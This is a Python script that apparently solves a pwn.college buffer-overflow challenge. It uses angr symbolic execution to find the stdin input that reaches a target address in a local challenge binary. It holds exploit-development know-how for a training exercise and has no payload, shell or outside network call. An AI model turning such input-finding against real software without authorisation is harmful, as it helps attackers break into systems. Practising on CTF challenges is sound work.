"""Angr-assisted buffer overflow: find input that reaches target address."""
import sys

import angr
from pwn import *
from pwn import process

PATH = "/challenge/binary-exploitation-lose-variable"

project = angr.Project(PATH)
initial_state = project.factory.entry_state(
    add_options={
        angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
        angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
    }
)
simulation = project.factory.simgr(initial_state)


def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return "pwn.college".encode() in stdout_output


def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return "ERROR".encode() in stdout_output or "Quitting".encode() in stdout_output

simulation.explore(find=0x00401873, avoid=should_abort)

if simulation.found:
    solution_state = simulation.found[0]
    res = solution_state.posix.dumps(sys.stdin.fileno())
    print(res)
    print(len(res))
else:
    raise Exception("Could not find the solution")

